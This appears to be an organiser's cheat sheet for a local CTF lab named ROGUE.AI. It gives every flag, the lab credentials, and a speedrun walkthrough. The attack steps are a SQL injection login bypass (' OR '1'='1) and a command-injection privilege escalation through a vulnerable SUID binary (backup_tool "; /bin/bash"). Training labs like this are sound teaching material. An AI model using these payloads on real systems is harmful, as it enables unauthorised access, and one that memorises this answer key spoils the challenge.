# 🤖 ROGUE.AI - Quick Reference Card

## Connection Info
- **Web:** http://localhost:5000
- **SSH:** `ssh ctfuser@localhost -p 2222`

## All Flags (for testing)
1. `CTF{w3lc0me_to_th3_syst3m}`
2. `CTF{sql_1nj3ct10n_m4st3r}`
3. `CTF{ssh_4cc3ss_gr4nt3d}`
4. `CTF{pr1v1l3g3_3sc4l4t10n_pwn3d}`
5. `CTF{4rt3m1s_shutd0wn_c0mpl3t3}`

## Credentials
- **Guest:** guest / guest123
- **Admin:** admin / Sup3rS3cur3P4ss!
- **SSH:** ctfuser / artemis2024

## Quick Commands

### SQL Injection
```sql
' OR '1'='1
admin'--
```

### Linux Commands
```bash
# List files (including hidden)
ls -la

# Read files
cat filename

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check bash history
cat ~/.bash_history
```

### Privilege Escalation
```bash
# Exploit backup_tool
backup_tool "; /bin/bash"

# Or read root files directly
backup_tool /root/flag4.txt
```

### Final Stage
```bash
# As root
python3 /root/decrypt_tool.py
```

## Stage-by-Stage Speedrun

### Stage 1 (1 min)
1. Open http://localhost:5000
2. Copy FLAG 1 from main page

### Stage 2 (2 min)
1. Enter `' OR '1'='1` in username
2. Click login
3. Go to System Logs
4. Copy FLAG 2

### Stage 3 (1 min)
1. Click File Browser
2. Click config.bak
3. Copy FLAG 3 and SSH credentials

### Stage 4 (3 min)
1. `ssh ctfuser@localhost -p 2222`
2. Password: artemis2024
3. `backup_tool "; /bin/bash"`
4. `cat /root/flag4.txt`
5. Copy FLAG 4

### Stage 5 (1 min)
1. (as root) `python3 /root/decrypt_tool.py`
2. Copy FLAG 5

**Total Time:** ~8 minutes

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Can't access web | Wait 10s after deploy |
| SQL injection not working | Use exact syntax: `' OR '1'='1` |
| SSH refused | Wait 15s for SSH to start |
| Can't see config.bak | Need admin access via SQL injection |
| backup_tool not found | Check `/usr/local/bin/backup_tool` |
| Still not root | Use: `backup_tool "; /bin/bash"` |

## File Locations

```
/home/ctfuser/
├── welcome.txt         # SSH welcome message
├── NOTES.txt          # Hints about backup_tool
└── .bash_history      # Command history with clues

/root/
├── flag4.txt          # Privilege escalation flag
├── artemis_shutdown.enc  # Encrypted final flag
└── decrypt_tool.py    # Decryption script

/usr/local/bin/
└── backup_tool        # Vulnerable SUID binary
```

## Admin Tasks

### Deploy
```bash
./deploy.sh
```

### Check Status
```bash
docker ps | grep artemis
```

### View Logs
```bash
docker-compose logs -f
```

### Reset Challenge
```bash
docker-compose down
docker-compose up -d --build
```

### Access Container
```bash
docker exec -it rogue-ai-artemis bash
```

### Stop
```bash
docker-compose down
```

## Hints at a Glance

💡 **Stage 1:** Just look at the page
💡 **Stage 2:** Try SQL injection: `' OR '1'='1`
💡 **Stage 3:** Look for .bak files
💡 **Stage 4:** Find SUID binaries
💡 **Stage 5:** Run the decrypt script as root

---

**For full details, see:**
- Players: `PLAYER_GUIDE.md`
- Organizers: `README.md` & `SOLUTION.md`
